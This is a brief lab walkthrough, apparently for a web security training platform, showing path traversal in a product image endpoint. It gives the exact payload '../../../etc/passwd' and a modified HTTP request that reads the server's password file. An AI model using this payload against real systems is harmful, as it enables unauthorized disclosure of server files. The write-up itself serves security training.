# Lab: File Path Traversal, Simple Case

## Objective

Exploit the path traversal vulnerability in the product image functionality to retrieve the contents of the `/etc/passwd` file.

## Vulnerability

The application uses a user-supplied filename parameter to load product images without properly validating the input. This allows an attacker to traverse directories and access arbitrary files on the server.

## Steps 

1. Open the lab and navigate to any product page.
2. Intercept the request for the product image using **Burp Suite**.
3. Identify the request containing the `filename` parameter.

### Original Request

```http
GET /image?filename=218.png HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

4. Modify the `filename` parameter to:

```text
../../../etc/passwd
```

### Modified Request

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

5. Forward the request.



The server returns the contents of the `/etc/passwd` file, confirming that the application is vulnerable to Path Traversal.


## Payload Used

```text
../../../etc/passwd
```
